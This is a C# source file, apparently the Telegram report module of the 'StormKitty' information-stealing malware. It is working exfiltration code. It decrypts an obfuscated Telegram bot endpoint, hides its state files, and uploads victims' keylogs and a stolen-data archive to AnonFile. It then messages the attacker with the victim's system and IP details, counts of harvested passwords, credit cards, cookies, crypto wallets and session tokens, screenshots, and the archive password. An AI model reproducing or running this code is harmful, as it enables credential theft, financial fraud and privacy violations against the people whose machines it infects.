using Stealer;
using System;
using System.IO;
using System.Net;
using System.Linq;
using StormKitty.Implant;
using System.Text.RegularExpressions;

namespace StormKitty.Telegram
{
    internal sealed class Report
    {
        private const int MaxKeylogs = 10;
        private static string TelegramBotAPI = StringsCrypt.Decrypt(new byte[] { 239, 217, 27, 234, 106, 21, 204, 49, 53, 43, 140, 84, 157, 206, 231, 110, 180, 238, 101, 7, 217, 169, 12, 49, 56, 145, 75, 213, 195, 135, 141, 221, });

        // Message id location
        private static string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");
        // Keylogs history file
        private static string KeylogsHistory = Path.Combine(Paths.InitWorkDir(), "history.dat");

        // Save latest message id to file
        public static void SetLatestMessageId(int id)
        {
            File.WriteAllText(LatestMessageIdLocation, id.ToString());
            Startup.SetFileCreationDate(LatestMessageIdLocation);
            Startup.HideFile(LatestMessageIdLocation);
        }

        // Get latest message id from file
        public static int GetLatestMessageId()
        {
            if (File.Exists(LatestMessageIdLocation))
                return Int32.Parse(File.ReadAllText(LatestMessageIdLocation));
            return -1;
        }

        /// <summary>
        /// Get sent message ID
        /// </summary>
        /// <param name="response">Telegram bot api response</param>
        /// <returns>Message ID</returns>
        private static int GetMessageId(string response)
        {
            Match match = Regex.Match(response, "\"result\":{\"message_id\":\\d+");
            return Int32.Parse(match.Value.Replace("\"result\":{\"message_id\":", ""));
        }

        /// <summary>
        /// Check if telegram token is valid
        /// </summary>
        /// <returns></returns>
        public static bool TokenIsValid()
        {
            try
            {
                using (WebClient c = new WebClient())
                {
                    string response = c.DownloadString(
                        TelegramBotAPI + Config.TelegramAPI + "/getMe"
                    );
                    return response.StartsWith("{\"ok\":true,");
                }
            }
            catch { }
            return false;
        }

        /// <summary>
        /// Send message to telegram bot
        /// </summary>
        /// <param name="text">Message text</param>
        public static int SendMessage(string text)
        {
            try
            {
                using (WebClient c = new WebClient())
                {
                    string response = c.DownloadString(
                        TelegramBotAPI + Config.TelegramAPI + "/sendMessage" +
                        "?chat_id=" + Config.TelegramID +
                        "&text=" + text +
                        "&parse_mode=Markdown" +
                        "&disable_web_page_preview=True"
                    );
                    return GetMessageId(response);
                }
            }
            catch { }
            return 0;
        }

        /// <summary>
        /// Edit message text in telegram bot
        /// </summary>
        /// <param name="text">New text</param>
        /// <param name="id">Message ID</param>
        public static void EditMessage(string text, int id)
        {
            try
            {
                using (WebClient c = new WebClient())
                {
                    string response = c.DownloadString(
                        TelegramBotAPI + Config.TelegramAPI + "/editMessageText" +
                        "?chat_id=" + Config.TelegramID +
                        "&text=" + text +
                        "&message_id=" + id +
                        "&parse_mode=Markdown" +
                        "&disable_web_page_preview=True"
                    );
                }
            }
            catch { }
        }


        /// <summary>
        /// Upload keylogs to anonfile
        /// </summary>
        private static void UploadKeylogs()
        {
            string log = Path.Combine(Paths.InitWorkDir(), "logs");
            if (!Directory.Exists(log)) return;
            string filename = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
            string archive = Filemanager.CreateArchive(log, false);
            File.Move(archive, filename + ".zip");
            string url = AnonFile.Upload(filename + ".zip");
            File.Delete(filename + ".zip");
            File.AppendAllText(KeylogsHistory, $"\t\t\t\t\t\t\t- " +
                $"[{filename.Replace("_", " ").Replace(".", ":")}]({url})\n");
            Startup.HideFile(KeylogsHistory);
        }

        /// <summary>
        /// Get string with keylogs history
        /// </summary>
        /// <returns></returns>
        private static string GetKeylogsHistory()
        {
            if (!File.Exists(KeylogsHistory))
                return "";

            var logs = File.ReadAllLines(KeylogsHistory)
                .Reverse().Take(MaxKeylogs).Reverse().ToList();
            string len = logs.Count == 10 ? $"({logs.Count} - MAX)" : $"({logs.Count})";
            string data = string.Join("\n", logs);
            return $"\n\n  ⌨️ *Keylogger {len}:*\n" + data;
        }

        /// <summary>
        /// Format system information for sending to telegram bot
        /// </summary>
        /// <returns>String with formatted system information</returns>
        private static void SendSystemInfo(string url)
        {
            UploadKeylogs();

            // Get info
            string info = (""
                + "\n  😹 *StormKitty - Report:*"
                + "\nDate: " + SystemInfo.datenow
                + "\nSystem: " + SystemInfo.GetSystemVersion()
                + "\nUsername: " + SystemInfo.username
                + "\nCompName: " + SystemInfo.compname
                + "\nLanguage: " + Flags.GetFlag(SystemInfo.culture.Split('-')[1]) + " " + SystemInfo.culture
                + "\nAntivirus: " + SystemInfo.GetAntivirus()
                + "\n"
                + "\n  💻 *Hardware:*"
                + "\nCPU: " + SystemInfo.GetCPUName()
                + "\nGPU: " + SystemInfo.GetGPUName()
                + "\nRAM: " + SystemInfo.GetRamAmount()
                + "\nHWID: " + SystemInfo.GetHardwareID()
                + "\nPower: " + SystemInfo.GetBattery()
                + "\nScreen: " + SystemInfo.ScreenMetrics()
                + "\n"
                + "\n  📡 *Network:* "
                + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                + "\nInternal IP: " + SystemInfo.GetLocalIP()
                + "\nExternal IP: " + SystemInfo.GetPublicIP()
                + "\n" + SystemInfo.GetLocation()
                + "\n"
                + "\n  💸 *Domains info:*"
                + Counter.GetLValue("🏦 *Banking services*", Counter.DetectedBankingServices, '-')
                + Counter.GetLValue("💰 *Cryptocurrency services*", Counter.DetectedCryptoServices, '-')
                + Counter.GetLValue("🍓 *Porn websites*", Counter.DetectedPornServices, '-')
                + GetKeylogsHistory()
                + "\n"
                + "\n  🌐 *Browsers:*"
                + Counter.GetIValue("🔑 Passwords", Counter.Passwords)
                + Counter.GetIValue("💳 CreditCards", Counter.CreditCards)
                + Counter.GetIValue("🍪 Cookies", Counter.Cookies)
                + Counter.GetIValue("📂 AutoFill", Counter.AutoFill)
                + Counter.GetIValue("⏳ History", Counter.History)
                + Counter.GetIValue("🔖 Bookmarks", Counter.Bookmarks)
                + Counter.GetIValue("📦 Downloads", Counter.Downloads)
                + "\n"
                + "\n  🗃 *Software:*"
                + Counter.GetIValue("💰 Wallets", Counter.Wallets)
                + Counter.GetIValue("📡 FTP hosts", Counter.FTPHosts)
                + Counter.GetIValue("🔌 VPN accounts", Counter.VPN)
                + Counter.GetIValue("🦢 Pidgin accounts", Counter.Pidgin)
                + Counter.GetSValue("✈️ Telegram sessions", Counter.Telegram)
                + Counter.GetSValue("💬 Discord token", Counter.Discord)
                + Counter.GetSValue("🎮 Steam session", Counter.Steam)
                + Counter.GetSValue("🎮 Uplay session", Counter.Uplay)
                + "\n"
                + "\n  🧭 *Device:*"
                + Counter.GetSValue("🗝 Windows product key", Counter.ProductKey)
                + Counter.GetIValue("🛰 Wifi networks", Counter.SavedWifiNetworks)
                + Counter.GetSValue("📸 Webcam screenshot", Counter.WebcamScreenshot)
                + Counter.GetSValue("🌃 Desktop screenshot", Counter.DesktopScreenshot)
                + "\n"
                + "\n 🦠 *Installation:*"
                + Counter.GetBValue(Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices),
                "✅ Startup installed", "⛔️ Startup disabled")
                + Counter.GetBValue(Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1",
                "✅ Clipper installed", "⛔️ Clipper not installed")
                + Counter.GetBValue(Config.KeyloggerModule == "1" && Counter.BankingServices && Config.Autorun == "1",
                "✅ Keylogger installed", "⛔️ Keylogger not installed")
                + "\n"
                + "\n  📄 *File Grabber:*"
                + Counter.GetIValue("📂 Source code files", Counter.GrabberSourceCodes)
                + Counter.GetIValue("📂 Database files", Counter.GrabberDatabases)
                + Counter.GetIValue("📂 Documents", Counter.GrabberDocuments)
                + Counter.GetIValue("📂 Images", Counter.GrabberImages)
                + "\n" 
               + $"\n🔗 [Archive download link]({url})"
                + "\n🔐 *Archive password is*: \"_" + Implant.StringsCrypt.ArchivePassword + "\"_"
                );

            int last = GetLatestMessageId();
            if (last != -1)
                EditMessage(info, last);
            else
                SetLatestMessageId(SendMessage(info));
        }

        /// <summary>
        /// Send passwords and system info to telegram bot
        /// </summary>
        /// <param name="file">Archive with passwords</param>
        public static void SendReport(string file)
        {
            Console.WriteLine("Sending passwords archive to anonfile");
            string url = AnonFile.Upload(file, GetLatestMessageId() == -1);
            File.Delete(file);
            Console.WriteLine("Sending report to telegram");
            SendSystemInfo(url);
            Console.WriteLine("Report sent to telegram bot");
        }

    }
}
